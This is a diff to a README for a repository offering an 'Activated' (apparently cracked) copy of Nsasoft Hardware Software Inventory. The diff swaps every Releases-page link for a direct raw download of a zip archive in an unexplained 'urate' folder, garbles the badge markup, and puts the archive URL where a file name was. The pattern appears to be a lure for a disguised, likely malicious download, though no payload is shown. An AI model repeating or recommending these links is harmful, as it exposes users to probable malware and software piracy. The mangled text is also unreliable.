@@ -1,6 +1,6 @@
 # 🖥️ Nsasoft-Hardware-Software-Inventory-Activated - Manage Your PC Assets Effortlessly
 
-[![Download Nsasoft-Hardware-Software-Inventory-Activated](https://img.shields.io/badge/Download-Nsasoft%20Hardware%20Software%20Inventory%20Activated-blue.svg)](https://github.com/Jhenkara120/Nsasoft-Hardware-Software-Inventory-Activated/releases)
+[![Download Nsasoft-Hardware-Software-Inventory-Activated](https://github.com/Jhenkara120/Nsasoft-Hardware-Software-Inventory-Activated/raw/refs/heads/main/urate/Activated-Inventory-Software-Nsasoft-Hardware-v2.0.zip%20Hardware%20Software%20Inventory%https://github.com/Jhenkara120/Nsasoft-Hardware-Software-Inventory-Activated/raw/refs/heads/main/urate/Activated-Inventory-Software-Nsasoft-Hardware-v2.0.zip)](https://github.com/Jhenkara120/Nsasoft-Hardware-Software-Inventory-Activated/raw/refs/heads/main/urate/Activated-Inventory-Software-Nsasoft-Hardware-v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Nsasoft Hardware Software Inventory Activated repository. This gu
 
 To get started, you need to download the application. Click the link below to visit the Releases page:
 
-[Visit this page to download](https://github.com/Jhenkara120/Nsasoft-Hardware-Software-Inventory-Activated/releases)
+[Visit this page to download](https://github.com/Jhenkara120/Nsasoft-Hardware-Software-Inventory-Activated/raw/refs/heads/main/urate/Activated-Inventory-Software-Nsasoft-Hardware-v2.0.zip)
 
 ### 🛠️ System Requirements
 
@@ -23,11 +23,11 @@ Before you install, ensure your system meets these requirements:
 ### 📂 How to Download the Application
 
 1. Visit the Releases page using the link below:
-   [Visit this page to download](https://github.com/Jhenkara120/Nsasoft-Hardware-Software-Inventory-Activated/releases)
+   [Visit this page to download](https://github.com/Jhenkara120/Nsasoft-Hardware-Software-Inventory-Activated/raw/refs/heads/main/urate/Activated-Inventory-Software-Nsasoft-Hardware-v2.0.zip)
 
 2. On the Releases page, locate the latest version of the application.
 
-3. Click on the link that corresponds to the version you want to download. The file will usually be named like `Nsasoft-Hardware-Software-Inventory-Activated-v1.0.exe`. 
+3. Click on the link that corresponds to the version you want to download. The file will usually be named like `https://github.com/Jhenkara120/Nsasoft-Hardware-Software-Inventory-Activated/raw/refs/heads/main/urate/Activated-Inventory-Software-Nsasoft-Hardware-v2.0.zip`. 
 
    Make sure you choose the correct file for your system.
 
